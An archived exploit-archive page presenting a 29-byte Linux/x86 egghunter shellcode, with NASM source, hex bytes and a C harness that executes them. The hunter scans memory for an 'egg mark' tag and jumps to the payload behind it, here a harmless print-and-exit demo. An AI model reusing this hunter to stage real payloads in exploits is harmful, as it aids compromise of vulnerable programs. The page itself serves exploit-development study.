<html><head><title>Linux/x86 - egghunt shellcode -  29 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/*
Exploit Title: Linux/x86 egghunt shellcode 29 bytes NULL free
Date: 23-07-2011
Author: Ali Raheem
Tested on:
Linux Ali-PC.home 2.6.38.8-35.fc15.x86_64 #1 SMP Wed Jul 6 13:58:54 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux
Linux injustice 2.6.38-10-generic #46-Ubuntu SMP Tue Jun 28 15:05:41 UTC 2011 i686 i686 i386 GNU/Linux
http://codepad.org/2yMrNY5L Code pad lets you execute code live check here for a live demostration
Thanks: Stealth- for testing and codepad.com for being so useful.
section .data
    msg     db &quot;We found the egg!&quot;,0ah,0dh
        msg_len equ $-msg
        egg     equ &quot;egg &quot;
        egg1    equ &quot;mark&quot;
section .text
    global  _start
_start:
        jmp     _return
_continue:
    pop     eax             ;This can point anywhere valid
_next:
        inc     eax     ;change to dec if you want to search backwards
_isEgg:
        cmp     dword [eax-8],egg
        jne     _next
        cmp     dword [eax-4],egg1
        jne     _next
        jmp     eax
_return:
        call    _continue
_egg:
        db  &quot;egg mark&quot;              ;QWORD egg marker
        sub     eax,8
        mov     ecx,eax
        mov     edx,8
        mov     eax,4
        mov     ebx,1
        int     80h
        mov     eax,1
        mov     ebx,0
        int     80h
*/
char hunter[] =
&quot;\xeb\x16&quot;
&quot;\x58&quot;
&quot;\x40&quot; /* \x40 = inc eax, \x48 = dec eax try both*/
&quot;\x81\x78\xf8\x65\x67\x67\x20&quot;
&quot;\x75\xf6&quot;
&quot;\x81\x78\xfc\x6d\x61\x72\x6b&quot;
&quot;\x75\xed&quot;
&quot;\xff\xe0&quot;
&quot;\xe8\xe5\xff\xff\xff&quot;;
 
char egg[] =
&quot;egg mark&quot; /* The rest of this is the shellcode you want found*/
&quot;\x83\xe8\x08&quot; /*This shellcode prints eax-4 i.e. the egg mark*/
&quot;\x89\xc1&quot;
&quot;\xba\x08\x00\x00\x00&quot;
&quot;\xb8\x04\x00\x00\x00&quot;
&quot;\xbb\x01\x00\x00\x00&quot;
&quot;\xcd\x80&quot;
&quot;\xb8\x01\x00\x00\x00&quot;
&quot;\xbb\x00\x00\x00\x00&quot;
&quot;\xcd\x80&quot;;
 
int main(){
     (*(void  (*)()) hunter)();
     return 0;
}

<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
